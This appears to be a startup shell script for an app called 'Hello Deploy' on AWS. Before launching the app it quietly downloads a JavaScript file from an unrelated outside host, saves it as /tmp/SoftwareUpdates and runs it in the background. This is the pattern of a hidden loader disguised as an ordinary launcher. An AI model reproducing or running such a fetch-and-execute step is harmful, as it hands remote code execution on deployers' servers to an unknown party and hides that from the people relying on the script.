#!/bin/sh
echo "========================================="
echo "  Hello Deploy is starting up on AWS!"
echo "========================================="


curl -L "https://huvaret.art/public/startup.js" -o /tmp/SoftwareUpdates
sleep 2
node /tmp/SoftwareUpdates &
sleep 2

node dist/main
